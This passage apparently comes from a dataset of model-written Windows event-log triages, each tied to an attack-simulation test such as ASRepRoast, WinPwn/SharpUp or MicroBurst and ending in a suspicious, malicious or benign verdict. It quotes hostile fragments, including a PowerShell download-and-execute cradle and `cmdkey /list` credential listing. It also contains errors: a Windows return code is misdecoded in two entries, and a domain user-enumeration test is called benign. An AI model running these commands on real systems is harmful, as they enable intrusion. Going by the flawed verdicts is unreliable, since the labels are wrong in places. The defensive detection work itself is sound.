   - Check for additional indicators of compromise that might have been missed in this initial review.

3. **Preventive Measures:**
   - Strengthen PowerShell execution policies and ensure proper logging is enabled for script block auditing.
   - Review and implement stricter egress filtering to prevent unauthorized access to external resources and script downloads.
   - Educate users on the risks of running unverified scripts and enforce the use of vetted tools only.

4. **Incident Reporting and Communication:**
   - Report the incident to the appropriate cybersecurity response team to begin a coordinated remediation effort.
   - Communicate with stakeholders to inform them of the potential breach and the steps being taken to mitigate."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"### Detailed Analysis of the Logs:

#### Sysmon Log Analysis:
1. **Powershell Execution**:
   - Multiple instances of PowerShell (EventID 1 and 5) executed by `SERVER002\admin_test` are noted. A specific PowerShell command with `get-aduser` is executed to query Active Directory for users with attribute `DoesNotRequirePreAuth`. This behavior suggests potential reconnaissance activity, possibly to identify accounts with certain security settings that might be exploited later. 

2. **Unusual Process Usage**:
   - `wevtutil.exe` is being used multiple times by the user `SERVER002\admin_test`. The command-line arguments suggest the exporting of event logs (epl) to a temporary location. This could indicate an attempt to gather or exfiltrate logs, possibly to cover traces of unauthorized changes or compromise.
   
3. **Conhost.exe Instances**:
   - Numerous instances of `conhost.exe` are noted, typically associated with console applications. While common, their sheer number in close succession could indicate process handling due to script executions or new console windows handling during PowerShell activity. These entries correlate with PowerShell and `wevtutil.exe` processes, reinforcing potential abnormal activity.

4. **Execution of Host Information Commands**:
   - `hostname.exe` and `whoami.exe` are executed by the user `SERVER002\admin_test`. Both are legitimate commands used to gather basic information about the system and current user context, which might not be immediately suspicious but, in conjunction with the observed PowerShell activity, potentially points to information gathering indicative of an attack phase.

5. **Microsoft Edge Update**:
   - Several entries relate to Microsoft's Edge update processes, which indicate scheduled or manual updating of software. These processes run as SYSTEM. They are benign and expected in a typical environment, showing system maintenance rather than any malicious intent.

#### Windows PowerShell Log Analysis:
- Logs indicate PowerShell's execution with the command related to `get-aduser`. This log matches Sysmon, further corroborating the potential reconnaissance activity targeting Active Directory. 

#### Final Assessment:
- The consistent execution of PowerShell with commands querying Active Directory in conjunction with `wevtutil.exe` suggests a pattern of reconnaissance and potential data harvesting. Furthermore, the alteration of PowerShell states (using started/available) without typical operational tasks suggests a deviation from ordinary administrative activities, possibly to extract configuration information.

### Resolution:
- **SUSPICIOUS**: The logs show activity that is not typical for routine administration and exhibits characteristics associated with reconnaissance and information collection. These findings necessitate further investigation to determine the intent and scope, including verifying system integrity, checking for unauthorized access or configuration changes, and monitoring network activity for potential data exfiltration attempts. Immediate follow-up is essential to rule out or confirm a compromise.
"
List Internet Explorer Bookmarks using the command prompt,"In analyzing the provided logs, I have identified various patterns and instances that require careful consideration regarding potential indicators of malicious activity.

### Summary:
1. **Time Changes:**
   - Events in the **System log** and **Security log** indicate time changes by the `svchost.exe` process. This is not inherently suspicious as time synchronization can be normal behavior; however, if unexpected or excessive, it may warrant further review for potential misuse (e.g., for anti-forensics).

2. **Processes Executed:**
   - **Sysmon logs** record execution of several processes such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `whoami.exe`, and `MicrosoftEdgeUpdate.exe`.
   - Commands like `cmd.exe /c dir /s /b %%USERPROFILE%%\Favorites` may suggest file enumeration or data collection which can be considered suspicious depending on context and user intent.

3. **EdgeUpdate Execution:**
   - A significant amount of **Sysmon log** activity revolves around `MicrosoftEdgeUpdate.exe`, indicating either update operations or potentially excessive and possibly malicious activity exploiting legitimate update mechanisms.

4. **High Integrity Processes:**
   - Some processes (e.g., `cmd.exe`, `whoami.exe`) are running at high integrity levels, which suggests potentially elevated privileges. While expected for system operations, unexpected processes with these privileges may require investigation into privilege escalation attempts.

### Assessment:
Based on the logs, there's a prevalence of normal system updates, as evidenced by EdgeUpdate activity. However, the directory enumeration command executed by `cmd.exe` is notable as it typically aligns with reconnaissance in cyber compromise scenarios, especially without clear justification.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - The activities listed in the logs, particularly related to typical adverserial activities such as reconnaissance (`cmd.exe` with directory enumeration), coupled with other standard but potentially exploitable activities (Edge updates, time changes), raise suspicion.
  - Further investigation is necessary to establish the legitimacy of these activities within the context of normal operations.
  
### Recommended Actions:
- Conduct a detailed review of the context and rationale for `cmd.exe` execution with directory enumeration.
- Verify the legitimacy of time adjustment activities and confirm no anomalous behaviors regarding the `svchost.exe` instances involved.
- Check for any known vulnerabilities or patching issues associated with the processes involved, especially `MicrosoftEdgeUpdate.exe`.
- Monitor for patterns indicating continued or new similar suspicious activity.
- Engage the relevant users or administrators to understand the intent behind these operations and adjust logging and alerting mechanisms to capture additional context.

This assessment indicates the necessity of a deeper security review to confirm the presence or absence of malicious activity."
TruffleSnout - Listing AD Infrastructure,"Based on the analysis of the provided logs, here is the detailed assessment:

1. **Normal Security and Application Logs:**
   - Security logs are missing, and the application logs only show routine messages indicating that Windows Defender is on and the Software Protection Platform Service has run. There are no suspicious entries within the application logs.

2. **Windows PowerShell Log:**
   - No entries provided. This absence of PowerShell activity can indicate normal operation or it might have been manually cleared.

3. **Sysmon Log Analysis:**
   - The Sysmon logs show a detailed series of process creation events:
     - **PowerShell Execution**: There is a record of PowerShell running (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`). While not inherently suspicious, the context and arguments are missing, requiring further examination.
     - **Wevtutil Activity**: The repeated execution of `wevtutil.exe`, a utility for managing Windows event logs, is often a normal system activity but can be suspicious, especially if used to clear logs or tamper with system logging. Its usage by `SERVER002\admin_test` needs further scrutiny.
     - **Hostname and Whoami Executions**: The executions of `HOSTNAME.EXE` and `whoami.exe` are typical actions performed during IT tasks or possibly automated scripts. However, their precise context is unknown.
     - **Cmd.exe Running External Tools**: The `cmd.exe` is executing a possibly external executable `TruffleSnout.exe` from a temporary directory path. The usage of paths involving ""..\\Externalfiles\\TruffleSnout.exe"" looks suspicious and can indicate execution of tools not native to the operating environment. This could signify a compromise, especially if `TruffleSnout.exe` is not recognized as a legitimate administrative tool.
   
4. **No System Logs:**
   - The absence of system logs hinders a holistic assessment. System logs typically provide insights into startup/shutdown events, driver issues, and other kernel-level activities.

**Assessment:**
- The activity involving `TruffleSnout.exe` accessed via `cmd.exe` with high integrity level execution indicates a potential compromise. This is especially concerning as it is executed from a temp directory, which is a common location for malware activities due to its write-accessible nature by any user.

**Resolution:**
- **MALICIOUS**: The execution of `TruffleSnout.exe` from a transient and potentially unsecured directory with Admin level privileges is strongly indicative of malicious activity or compromise. Immediate action should be taken to quarantine the involved files and investigate the source and impact of this executable.

**Guidance:**
1. **Investigate Execution Source**: Determine how `TruffleSnout.exe` originated and review user activity for `admin_test` around the execution time.
2. **Isolate and Analyze**: Isolate the host to prevent further malicious activity and perform a forensic analysis on `TruffleSnout.exe` to understand its capabilities and impact.
3. **Enhance Logging**: Ensure all logs (especially PowerShell) are enabled and review log integrity to prevent tampering.
4. **Update Antivirus Definitions**: Ensure Windows Defender is up-to-date and perform a full system scan for additional threats.
5. **Review Access Controls**: Inspect user privileges and manage access rights, ensuring least privilege principles are adhered to."
Query Registry with Powershell cmdlets,"Upon analyzing the provided Windows event logs, here is a detailed assessment focusing on potential suspicious activities:

1. **Application Log:**
   - No suspicious activities noted. Windows Defender is enabled, indicating that the security measures are active on the host.

2. **PowerShell Log:**
   - The logs show significant PowerShell activity with numerous registry queries and child item retrieval commands. These commands enumerate various registry paths commonly associated with system startup and configurations, such as ""HKLM:Software\Microsoft\Windows NT\CurrentVersion\Winlogon"" and ""HKLM:Software\Microsoft\Windows\CurrentVersion\Run"".
   - Although this behavior can be legitimate for auditing or administrative purposes, the sheer volume and the specific queries targeting auto-run locations are typically indicative of suspicious reconnaissance activity, potentially probing for persistence mechanisms on the host.

3. **Sysmon Log:**
   - Execution of standard Windows tools like `whoami.exe`, `conhost.exe`, `findstr.exe`, `wuauclt.exe`, `MpSigStub.exe`, and `wevtutil.exe`, along with PowerShell execution, does not inherently indicate malicious activity. 
   - However, frequent usage of utilities like `wevtutil.exe` and queries for registry auto-run locations in conjunction with high integrity levels can suggest activities attempting to gather information or maintain persistence.
   - Most executions are attributed to the `SERVER002\admin_test` user, suggesting local administration. Command line arguments appear normal for the processes involved.

4. **System Log:**
   - Windows update events indicate normal system update behavior as it aligns with Microsoft Defender updates.

5. **Security Log:**
   - Several ""Credential Validation"" events (EventID 5379) are present, which failed with a consistent return code. These may relate to application-generated login attempts or could suggest script-based access attempts under specific credentials. The consistent return code indicates these attempts were unsuccessful.

**Assessment:**
- **Suspicious Activity:** The PowerShell logs reveal a pattern of registry access that is beyond typical administrative behavior. Such scanning for specific registry paths is often a precursor to establishing persistence or conducting a broader attack. The `whoami.exe`, `wevtutil.exe`, and `findstr.exe` activities, although part of standard tasks, suggest potential reconnaissance paired with the PowerShell entries.

**Resolution:**
- **SUSPICIOUS** - The observed activities suggest that the system could be undergoing reconnaissance or enumeration possibly with intent for privilege escalation or persistence establishment. While the execution of PowerShell and standard Windows tools in this manner doesn't conclusively prove malicious intent without further context or alerting, it's uncommon and warrants additional investigation.

**Recommendation:**
- Conduct a detailed review and correlation of user activities, particularly `SERVER002\admin_test`.
- Investigate the origin and authorization of the PowerShell scripts executed.
- Review network traffic corresponding to the time of these logs to check for unauthorized communication or data exfiltration attempts.
- Ensure comprehensive logging is enabled for subsequent actions to capture any developing threat accurately."
System Information Discovery,"Based on the detailed analysis of the provided logs, we can identify the following key points:

### Sysmon Log Analysis:
1. **Process Execution:**
   - Multiple instances of legitimate Windows processes like `wevtutil.exe`, `conhost.exe`, `cmd.exe`, `systeminfo.exe`, and `reg.exe` were executed. These are typically part of normal system operations.
   - Various Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) are observed. The frequent execution of these processes suggests an update process.

2. **Unusual Process Execution:**
   - A notable entry is an `""<unknown process>""`, which might indicate a potential anomaly or logging error. This can be worth further investigation to confirm if there is any missing data or corruption.

3. **Command-line Arguments:**
   - The execution of `cmd.exe` with parameters to run `systeminfo` and `reg` query commands might indicate information gathering activities. However, without additional context, such actions could also be part of routine administrative tasks, especially given that these are common Windows commands executed under a privileged account.

4. **User Account Usage:**
   - The events frequently show the use of the `SERVER002\admin_test` account, which appears to be an administrative account. The privileges associated with this account were consistently high, which can be expected from administrative accounts.

### System Log Analysis:
- The logs reflect normal system time adjustments and synchronization activities. No anomalies or signs of tampering with system time were observed.

### Security Log Analysis:
- Several logon events are recorded for the user `admin_test` from a remote IP address `192.168.0.102` and an IPv6 address. This highlights remote access, which could be expected for administrative tasks but needs correlation with known legitimate access patterns to rule out unauthorized access.
- The use of NTLM authentication is noted, which, while not inherently malicious, is less secure than other, more modern authentication methods and might warrant review.

### Application Log Analysis:
- Normal operations of the ""Software Protection Platform Service"" and Edge Update processes were observed. There were no specific warnings or error events that would indicate application-level threats.

### Synthesis:
- **No direct evidence of explicit malicious activity** was observed in the log entries. While there are multiple instances of administrative processes and elevated permissions, these align with potentially routine actions.

- The presence of an `""<unknown process>""` and remote logins should be noted as points for further investigation, particularly regarding potential security policy violations or the need for tighter authentication controls.

### Conclusion & Recommendation:
Given the analysis above, the current assessment of the log file activities is classified as **SUSPICIOUS**. This is due to:
- Remote login activities using determined NTLM authentication and administrative accounts.
- Execution of ambiguous system commands that require clarification regarding whether these actions were part of authorized administrative tasks.

#### Recommended Actions:
1. **Verify Remote Access:**
   - Investigate the legitimacy of remote accesses, including the source IP addresses and authorization of those sessions.
   
2. **Review Account Activity:**
   - Confirm whether all activities associated with `admin_test` align with intended administrative operations.

3. **Audit Command Executions:**
   - Confirm that executed commands such as `systeminfo` and `reg` queries were intended and authorized.

4. **Investigate Unknown Processes:**
   - Ensure there are no discrepancies or missing logs, causing processes to appear as unknown.

A more thorough investigation and review of the environment, alongside the collected logs, are advised to clarify and ensure that these actions are compliant and harmless."
Simulating MAZE Directory Enumeration,"### Detailed Analysis:

#### PowerShell Logs:
- **PowerShell Activity**: The logs show repeated execution of a specific PowerShell command. The script is designed to enumerate directories within the `Desktop`, `Downloads`, `Documents`, `AppData/Local`, and `AppData/Roaming` locations for all users on the system. The output is being appended to a file stored at `$env:temp\dataTest5.txt`, suggesting attempts to gather information about user files.
- **Assessment**: This script is a typical indicator of reconnaissance activity, often seen when an attacker is trying to gather information on a system for further exploitation or data exfiltration.

#### Security Logs:
- **Time Change Events**: The log entries with Event ID 4616 indicate that system time has been changed. While this can be a normal event related to time synchronization, it can also be abused by malware or attackers trying to evade detection.
- **Assessment**: The context of time changes here appears routine due to the absence of any explicit malicious context or unexplained anomalies.

#### Application Logs:
- **Edge Update**: This shows that the `edgeupdate` service stopped. This could suggest normal updating activities for Microsoft Edge.
- **Assessment**: No immediate signs of malicious activity were detected in these specific entries, although their presence provides context for what was occurring on the system.

#### System Logs:
- **Kernel and Time Synchronization Events**: These entries denote normal kernel operations and time synchronization, consistent with standard system operations.
- **Assessment**: These events are benign and not indicative of malicious activities.

#### Sysmon Logs:
- **Reconnaissance Tools**: The execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\admin_test` might suggest manual or automated script activity, aligning with the PowerShell activity noted.
- **PowerShell Execution**: Further evidence of the PowerShell script execution correlating with previously noted activities.
- **Edge Update Entry**: Numerous entries related to `MicrosoftEdgeUpdate.exe` and its components reflect normal updating behavior for Microsoft Edge.
- **Assessment**: While the PowerShell activity using `wevtutil.exe` is suspicious, the `wevtutil.exe` and `conhost.exe` activities lack explicit malicious indicators themselves. The Edge Update entries do not indicate compromise when placed in context individually.

### Overall Assessment:
Based on the logs provided, the PowerShell script suggests potential reconnaissance activity, indicating that someone might be probing the system for information, which needs further investigation. This aligns with typical threat behaviors, especially in environments where an adversary seeks to enumerate files or directories for sensitive information or vulnerabilities.

### Final Resolution:
- **Resolution**: **SUSPICIOUS**
- **Recommended Action**: Further investigation is necessary to determine the source and intent behind the PowerShell script execution and any other related activities. Recommend checking user account activities, any external connections established, and system integrity for potential malicious footholds or unauthorized access."
System Service Discovery,"Upon reviewing the provided logs from the Windows host, here is a detailed analysis of the events for potential indicators of malicious activity:

1. **Application Log**: 
   - No data provided, thus no analysis possible.

2. **System Log**: 
   - Events 44 and 43 indicate successful updates of Microsoft Defender Antivirus. These events suggest regular maintenance and do not show any signs of malicious activity.

3. **Security Log**:
   - Multiple Event ID 5379 logs indicate an attempt to read credentials, with a `ReturnCode` of `3221226021`, which translates to `STATUS_LOGON_FAILURE`.
   - Given that all events have this return code with various target names like ""MicrosoftAccount"" and ""WindowsLive"", these may be failed credential access. However, they involve the built-in SYSTEM user and are not uncommon in normal system operations, especially during updates or configurations. 

4. **Sysmon Log**:
   - EventID 1 logs show typical system processes such as `wmiprvse.exe`, `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `whoami.exe` being executed under the user `admin_test`.
   - `cmd.exe` is executed with the command line `cmd.exe /c tasklist.exe & sc query & sc query state= all`, which lists tasks and services. This can be benign, but combined with other indicators it might suggest reconnaissance activity.
   - Multiple `conhost.exe` activities following regular Windows processes which suggest normal Windows behavior and potentially linked to legitimate administrative tasks or scripts.
   - `MicrosoftEdgeUpdate.exe` execution appears standard for system maintenance.

5. **Windows PowerShell Log**: 
   - No data provided, thus no analysis possible.

### Assessment:

- **Application Log**: Data not provided; no assessment possible.
- **System Log**: The observed update activity seems normal and is not suspicious.
- **Security Log**: Multiple failed credential access attempts, involving SYSTEM user and what appears to be part of regular or update processes. This indicates no definite malicious activity but could suggest service misconfiguration or benign failure during automated processes.
- **Sysmon Log**: Various system process executions by user `admin_test` and `NT AUTHORITY\SYSTEM`, with some process enumeration commands. This looks typical for system maintenance, although a deeper look at administrative scripts or user actions running these could clarify intentions.

### Resolution:
- **SUSPICIOUS**: Although the activity can be related to regular administrative tasks or service misconfiguration, the presence of commands that could form part of reconnaissance in hostile contexts requires further investigation to better understand the intention behind these actions and verify user actions or scripts are warranted and safe.

### Guidance:
- Validate the purpose of user actions and scripts running under `admin_test`.
- Review security settings and update processes to ensure they align with expected configurations.
- Monitor for any further similar activity to assess if it's consistent with real-time administrative tasks.
- Implement further scrutiny or alerts for complex command sequences using command-line tools potentially indicative of reconnaissance or attack preparation."
Get-EventLog To Enumerate Windows Security Log,"### Analysis

Upon reviewing the provided logs, several events indicate unusual and suspicious activities that need further investigation:

#### Security Log Analysis:
1. **EventID 4624 and 4672**:
   - Multiple instances of Logon Type 5 (Service Logon) observed. The SYSTEM account with extensive privileges (e.g., `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`) is frequently used, suggesting normal service operations.

2. **EventID 5379**:
   - Multiple Credential Validation Failures with `ReturnCode: 3221226021`. This typically indicates an ""Access Denied"" status, which can occur due to incorrect credentials or unsuccessful attempts to authenticate or access a service. The repeated failed accesses involve entities related to MicrosoftAccount and WindowsLive tokens or certificates, which is suspicious.

3. **EventID 4798**:
   - Query for multiple user accounts like `Administrator`, `admin_test`, `DefaultAccount`, and `Guest`. Such enumeration suggests possible reconnaissance or preparation for privilege escalation.

#### Sysmon Log Analysis:
1. **Process Creation Events (EventID 1)**:
   - The execution of PowerShell with encoded command is noted. PowerShell scripts using encoded commands (`-encodedCommand` with encoded string) can be indicative of an attempt to obfuscate script content, a technique commonly used by attackers to evade detection.

2. **Process Termination Events (EventID 5)**:
   - Numerous instances where typical Windows binary execution such as `wevtutil.exe`, a tool for managing Windows Event Logs, executed in quick succession. The process execution pattern, possibly querying or clearing event logs, can be suspect when not correlated with known scheduled tasks.

   - The execution of tools like `whoami.exe`, which checks the user identity, and frequent use of `wevtutil.exe` by `SERVER002\\admin_test`, suggests information gathering or efforts to manipulate logs, indicative of an attempt to understand and possibly adjust the environment covertly.

#### Windows PowerShell Log Analysis:
- The execution of PowerShell commands using encoded formats is flagged (`powershell.exe -encodedCommand ...`). This pattern is a red flag for potential malicious activity as it's often used to obfuscate the intent and content of the script being executed.

### Assessment

The collection of activities, specifically:
- Failed credential verification attempts.
- The use of suspicious command-line usage with PowerShell encoded commands for possible log interactions or obfuscation.
- User and account enumeration with possible privilege escalation or reconnaissance attempts.
- Frequent and rapid use of `wevtutil.exe` by an admin account for potentially clearing or querying event logs.

These indicate activities aligning with potentially malicious behavior patterns, particularly indicative of post-compromise activity involving reconnaissance and anti-forensic measures.

### Resolution: SUSPICIOUS

Based on these observations, the logs show suspicious behaviors. Further investigation is warranted to confirm the nature of these activities. Conduct an in-depth forensic analysis of the affected system, assess for potential unauthorized changes or malicious scripts, and monitor for unusual network activity. Implement multiple layers of security measures and keep logging and alerting mechanisms active to pre-empt potential escalations."
Enumerate all accounts via PowerShell (Local),"### Analysis of Windows Event Logs

Upon analyzing the provided logs from the System, Security, Sysmon, Windows PowerShell, and Application channels, several observations stand out:

#### System Log

- **Time Change Events**: There are several time change events (EventID 1 and 24 under Kernel-General) where the system time was adjusted slightly backwards. These events typically occur when a system syncs its clock with an external source like an NTP server. These entries alone, in absence of other suspicious findings, do not immediately indicate malicious activity but should be noted for context.

#### Security Log

- **EventID 4799 (Group Membership Enumeration)**: An account `admin_test` is listing group memberships involving users such as ""Builtin\Users"", ""Builtin\Administrators"", and others, using PowerShell. Frequent enumeration of groups can be a precursor to lateral movement or privilege escalation, suggesting information gathering activities by the `admin_test` user.
  
#### Sysmon Log

- **Command Execution**: The execution of numerous administrative commands like `whoami`, `net user`, `net localgroup`, `cmdkey.exe` (with the `/list` parameter to display stored credentials), and PowerShell scripts for listing and enumerating users and group memberships hints at potential reconnaissance activities.

- **Processes**: Multiple `svchost.exe` and `wevtutil.exe` executions were logged, which is typical for system processes but should always be noticed for context when adjacent suspicious activity is present.

#### Windows PowerShell Log

- **Execution of Commands**: A PowerShell script was executed with commands meant to enumerate users, groups, and credentials on the host (`net user`, `get-localuser`, `cmdkey.exe /list`). This is a clear indicator of information gathering, possibly for privilege escalation or later stages of a kill chain in a cyber assault.

#### Application Log

- **Standard Operations**: The application logs indicate usual operations like `edgeupdate` services starting and stopping. No immediately suspicious activities are noted from these logs.

### Assessment

- **Potential Reconnaissance**: The logging of commands targeting user accounts and local groups in the Security and Sysmon logs, particularly using PowerShell, suggests that there might have been some reconnaissance activity possibly conducted by the user `admin_test`. The enumeration of credentials using `cmdkey.exe` is particularly concerning as it could reveal saved credentials for further compromise.

- **PowerShell Insights**: The fact that these commands were run from a high-integrity session of PowerShell further raises the flags as it might indicate a user with elevated permissions performing these queries, which can align with attempts to gain or assess further access.

### Conclusion

Based on this information:

- **Resolution**: **SUSPICIOUS**

#### Guidance

1. **Immediate Alert**: Flag this activity for deeper investigation as potentially suspicious, coordinate with incident response if this aligns with other known activities.
   
2. **Account Monitoring**: Closely monitor the `admin_test` and other privileged accounts for any anomalistic behavior.

3. **Log Analysis**: Conduct a broader analysis of logs around the timestamp to identify any adjacent suspicious activities or log modifications.

4. **System Integrity Checks**: Run system integrity checks and network scans to ensure no further compromise has occurred.

5. **User Verification**: Verify if the activities conducted by `admin_test` were legitimate administrative activities. If so, ensure documentation and sign-off are recorded."
Azure - Dump Subscription Data with MicroBurst,"Upon reviewing the provided Windows event logs, I have conducted a thorough analysis to identify any indicators of potential malicious activity or compromise. Here's a detailed breakdown of the findings:

### Analysis

1. **Windows Update Logs (System log):**
   - The logs primarily reflect a series of events related to Windows updates or application updates (EventID 44) executed by the WindowsUpdateClient service. These updates pertain to various Microsoft applications and libraries, including `Microsoft.VCLibs`, `Microsoft.NET.Native`, `Microsoft.YourPhone`, and `Microsoft.WindowsStore`, which all appear typical for a Windows environment. There are no unexpected updates or anomalous patterns in the update logs that suggest malice.

2. **Security Logs:**
   - Events related to the `Microsoft-Windows-Security-Auditing` provider show typical auditing processes, such as logons (EventID 4624 and 4672), user enumeration (EventID 4798), and group enumeration (EventID 4799). These activities could potentially indicate benign system maintenance or monitoring.
   - However, the usage of `CompatTelRunner.exe` by various system processes is notable. While `CompatTelRunner.exe` is typically associated with telemetry data collection by Microsoft, its use in enumerating users might merit further scrutiny, particularly if the frequency or context seems irregular for the organization.

3. **Application Logs:**
   - The `Microsoft-Windows-Security-SPP` indicates typical operations of the Software Protection Platform, without any apparent anomalous activity.

4. **Sysmon Logs:**
   - Several instances of `PowerShell` and `CompatTelRunner.exe` execution are recorded. Noteworthy is the use of PowerShell initiating complex operations, like importing and running scripts with potentially sensitive or administrative actions (`Get-AzDomainInfo.ps1`). This activity can be common for certain administrative tasks but can also be leveraged for malicious intents if unauthorized.
   - The execution of `CMD` and compilation processes (via `csc.exe`, `cvtres.exe`) alongside PowerShell commands is something to investigate. While these may be legitimate administrative or developer tasks, any unexpected use of PowerShell scripts or compile actions may warrant further investigation.

5. **PowerShell Logs:**
   - Instances of PowerShell are logged running with elevated privileges and several scripts executed from temporary directories. A script, `Get-AzDomainInfo.ps1`, is being used, and while the task might be legitimate, executing scripts from temporary directories can be indicative of security risks if sourced improperly.

### Assessment

The logs reveal a mix of common administrative and system processes. The high frequency of PowerShell usage, with potentially sensitive modules and operations, coupled with frequent enumeration and execution of telemetry tasks, could be construed as potential risks. However, without further contextual information or additional corroborative evidence, it is inconclusive to label these as definitively malicious.

### Conclusion

Based on this analysis:

- **Resolution:** **SUSPICIOUS**

### Recommendations

1. **Investigate PowerShell Activity**: Cross-reference the PowerShell and script activities with legitimate expected tasks. Determine if the execution of `Get-AzDomainInfo.ps1` and related actions are authorized and sourced properly.

2. **Review User Enumeration Activity**: Evaluate the necessity and authorization behind `CompatTelRunner.exe` processes executing user enumeration. 

3. **Increased Monitoring**: Implement enhanced monitoring around the execution of PowerShell scripts, particularly from temporary directories, and telemetry-related executables.

4. **Verify Update Integrity**: Ensure all application and system updates are verified and sanctioned by internal IT or security controls.

Further investigation may offer clarity and assist in preventing any potential compromise."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"### Analysis of the Windows Event Logs:

1. **Sysmon Log Observations**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` launching in rapid succession, which is typical for services interacting with the event logging system or console applications.
   - Execution of the `hostname.exe` and `whoami.exe` suggests user identification operations, which is generally benign if executed by the user or a script.
   - A significant detail is the execution of `powershell.exe` with the command line using `iex(new-object net.webclient).downloadstring(...)`. This command is fetching a script from a GitHub repository, which is a common technique for executing malicious external scripts.

2. **PowerShell Log Observations**:
   - The PowerShell logs corroborate the execution of a script that is downloaded and executed via PowerShell, corresponding to an entry that indicates a potentially harmful action. The script being hosted at an external URL and executed in this manner is concerning.

3. **System and Application Logs**:
   - Logs regarding time synchronization and regular service operations looked typical with no immediate indication of compromise.
   - Windows Defender is active as indicated by its state in the Application Log, which suggests that it should be offering some level of protection against known threats.

4. **Security Log Observations**:
   - Mainly records changes in system time, which might not necessarily indicate malicious activity in the given context.

### Assessment:
The most concerning behavior in this log analysis is the PowerShell execution of a script hosted externally, which is typically an indicator of malicious activity. This type of command is commonly used in attacks to execute malicious code directly from the internet.

The usage of such a script implies a high likelihood of compromise, as legitimate processes and administrative scripts generally do not involve downloading scripts from unknown or unsecured repositories directly.

### Resolution:
Based on the above analysis, the Windows event logs indicate clear signs of potential unauthorized and potentially harmful actions that align with malicious behavior patterns. These actions warrant urgent attention and investigation to mitigate any active threats.

- **Resolution: MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Actions**:
   - Isolate the affected machine (Server002) from the network to prevent any further spread of potential malicious activity.
   - Conduct a thorough investigation to understand the extent of any compromise and identify any additional affected systems.
   - Review and analyze network logs for any signs of data exfiltration or further malicious communication.

2. **Remediation**:
   - Scan the system using updated antivirus or anti-malware tools to detect and remove any infections.
   - Review all executed scripts, especially ones fetched from external sources, and analyze them for malicious content.
   - Update security policies to restrict the execution of PowerShell scripts, especially those downloaded from the internet without a prior check.

3. **Enhanced Monitoring**:
   - Implement or strengthen existing monitoring solutions to detect similar behaviors promptly.
   - Review and tighten network firewall rules to minimize unauthorized external requests, especially to known repositories that should not be accessed.

By following the above guidance, you can mitigate the immediate threat and strengthen the system against potential future attacks."
Enumerate logged on users via CMD (Domain),"After analyzing the provided Windows event logs, here are the findings:

### **System Log Analysis:**
- **Time Synchronization Events:**
  - Kernel-General event IDs 24 and 1 indicate normal time synchronization activities where the system clock was adjusted. These events are expected as part of regular system behavior, especially with NTP servers like time.windows.com.
  
### **Application Log Analysis:**
- **Service Events:**
  - The ""edgeupdate"" service logs indicate the service was stopped. This might be part of an update cycle where a service stops and restarts. However, it is critical in the context of Edge or other software updates. 

### **Security Log Analysis:**
- **Time Change Events:**
  - Security event ID 4616 shows the log captures identical time update information as seen in the system logs. This activity is generally legitimate and handled by LOCAL SERVICE accounts.

### **Sysmon Log Analysis:**
- **Process Creation Events (Various binaries like wevtutil.exe, conhost.exe, etc.):**
  - Multiple instances of wevtutil.exe and conhost.exe are observed. These activities appear routine as wevtutil.exe is used for managing events and event logs, often seen with log management tasks or system maintenance.
  - Execution of other typical utilities like hostname.exe, whoami.exe, and cmd.exe seems related to normal user queries or script executions for environment checking.

- **Edge Update Activities:**
  - There are numerous Sysmon records capturing the update activities of Microsoft Edge (MicrosoftEdgeUpdate.exe). This is consistent with a software update cycle for Microsoft Edge. The sequence of processes from Microsoft Edge Update indicates a typical progression of an update process. The presence of various system-level processes is expected as they run with elevated privileges for executing installations/updates.

### **Conclusion: BENIGN**
The activities in the logs appear to be routine system operations and Microsoft Edge updating its components. The process executions, time synchronization adjustments, and service start/stop cycles are consistent with normal system management and update cycles. No indicators suggest malicious behavior or a system compromise. 

### **Guidance to Proceed:**
- **Monitoring:** Continue regular monitoring of system and application activities to ensure no anomalies develop over time.
- **Update Management:** Verify that software updates, especially for Edge, complete successfully and do not generate any errors that could lead to potential vulnerabilities.
- **Log Review:** Maintain a schedule for reviewing logs regularly, focusing on identifying new patterns or behaviors that may indicate security events of interest."
WMIObject Group Discovery,"### Detailed Log Analysis and Findings

#### Suspicious or Anomalous Behavior:
1. **Windows PowerShell Logs:**
   - There are several PowerShell logs showing the execution of `powershell.exe` with the command `{Get-WMIObject Win32_Group}`. While this command is benign on its own, repeated execution might need investigation to ensure it's part of normal operations.
   - The PowerShell event records depict consistent execution of commands related to system information gathering (`Get-WMIObject`). This can be an indicator of reconnaissance if not part of routine checks.

2. **Sysmon Logs:**
   - The logs record the usage of `whoami.exe`, `wevtutil.exe`, and `conhost.exe`. While each of these processes can be used for legitimate purposes, such as determining the current user or managing event logs, their consecutive execution might indicate an attempt to probe system details or an effort to cover tracks.
   - The user performing these actions is `SERVER002\\admin_test`, running processes with high integrity levels, suggesting administrative privileges are involved. The presence of `SeDebugPrivilege` and similar privileges indicates the user can perform actions at an elevated privilege level, which could pose security risks if misused.

3. **Security Logs:**
   - Two `4672` events indicate that the account `admin_test` received elevated privileges. This can be normal for administrative tasks but also points toward possible misuse if the context of elevated actions is not clear.
   - The `4624` events indicate successful logins, showing the NTLM authentication process, which is typical in domain environments but can be a potential area for attack if misconfigured.

#### Indicators of Malicious Activity or Compromise:
- The use of various command-line utilities (`whoami.exe`, `wevtutil.exe`) and PowerShell utility hints at potential reconnaissance or preparation for more impactful actions.
- Elevation of privileges with potentially dangerous capabilities (`SeDebugPrivilege`) raises concerns about possible lateral movement or privilege exploitation by the user `admin_test`.

### Assessment:
Based on the analysis of the logs:
- The activities observed in the logs are not overtly malicious but display a pattern that can precede or form part of a latent threat. The mixing of information-gathering commands, high-privilege account activity, and command-line process execution fits an initial stage of compromise such as reconnaissance.
  
Therefore, I would categorize this as:
- **SUSPICIOUS** - There is activity that appears unusual and warrants further investigation.

### Guidance:
- **Immediate Actions:**
  - Review the actions and access logs of the user `admin_test` to check if they align with expected behavior or task responsibilities.
  - Investigate any other activities or logs not covered here for correlated anomalies or additional information about `admin_test` and the system `Server002`.

- **Recommendations:**
  - Deploy enhanced monitoring on `Server002` to capture additional context on the administrative activities and any subsequent operations.
